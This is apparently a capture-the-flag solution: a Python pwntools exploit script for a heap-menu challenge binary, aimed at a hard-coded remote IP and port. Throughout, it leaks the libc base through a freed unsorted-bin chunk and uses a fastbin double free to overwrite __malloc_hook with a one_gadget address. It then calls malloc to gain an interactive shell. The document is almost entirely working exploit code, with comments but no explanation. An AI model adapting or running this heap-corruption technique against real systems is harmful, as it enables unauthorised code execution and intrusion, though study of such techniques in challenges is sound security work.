from pwn import *

# env={'LD_PRELOAD':'./libc.so.6'},
#p = process(['./pwn2'], aslr='FALSE')
p = remote("124.16.75.117", 51006)
context.log_level = "debug"
one_gadget = 0x10a41c
main_arena = 0x3ebc40 + 0x60
lib = ELF('./libc.so.6')
malloc_hook = lib.sym['__malloc_hook']

def create(size, content):
	p.sendafter("4. Show String\n", "1")
	p.sendafter("Input your size: ",str(size))
	p.sendafter("Input your content: ", content)

def edit(idx, content):
	p.sendafter("4. Show String\n", "2")
	p.sendafter("Select string: ", str(idx))
	p.sendafter("Input your content: ", content)

def show(idx):
	p.sendafter("4. Show String", "4")
	p.sendafter("Select string: ", str(idx))

def free(idx):
	p.sendafter("4. Show String\n", "3")
	p.sendafter("Select string: ", str(idx))
	

def main():
	# leak libc addr	
	create(0x600, "Unsortedbin") # 0

	for i in range(7):
		create(0x68, "XXXXX") # Fill the tcache	

	free(0)
	show(0)
	p.recvuntil("\n")
	libc_base = u64(p.recvuntil("\n", drop=True).ljust(8, "\x00")) - main_arena
	log.success("Libc Base:" + hex(libc_base))
	# pause()
	
	for i in range(7):
		free(i+1)

	# fastbin attack rewrite malloc_hook content
	create(0x68, "AAAAA") # 7
	create(0x68, "BBBBB") # 8
	
	#gdb.attach(p)
	#pause()	
	
	free(8) # double free
	free(9)
	free(8)
	# edit 7
	log.success("malloc_hook: " + hex(libc_base + malloc_hook))
	# pause()
	create(0x68, p64(libc_base + malloc_hook - 0x23)) # 8 malloc_hook
	pause()	
	create(0x68, "DDDDD") # 9
	create(0x68, "EEEEE") # 8 again
	log.success("One_gadget: " + hex(libc_base + one_gadget))
	#pause()
	create(0x68, 'A'*0x13 + p64(libc_base + one_gadget)) # write to malloc_hook with one_gaget
	# call malloc
	p.sendafter("4. Show String\n", "1")
	p.sendafter("Input your size: ","0")
	p.interactive()

if __name__ == "__main__":
	main()
